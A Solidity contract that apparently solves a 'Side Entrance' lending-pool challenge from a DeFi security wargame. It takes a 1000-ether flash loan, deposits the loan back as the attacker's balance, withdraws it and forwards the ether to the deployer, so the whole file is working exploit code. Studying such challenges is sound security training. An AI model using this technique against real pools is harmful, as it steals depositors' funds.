// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract AttackSideEntrance is IFlashLoanEtherReceiver {

    SideEntranceLenderPool attackContract;
    address attacker;

    constructor(SideEntranceLenderPool _attackContract) {
        attackContract = _attackContract;
        attacker = msg.sender;
    }

    function attack() external {
        attackContract.flashLoan(1000 ether);
        attackContract.withdraw();
    }

    function execute() external override payable {
        attackContract.deposit{value : 1000 ether}();
    }

    receive() external payable {
        attacker.call{value: 1000 ether}("");
    }

}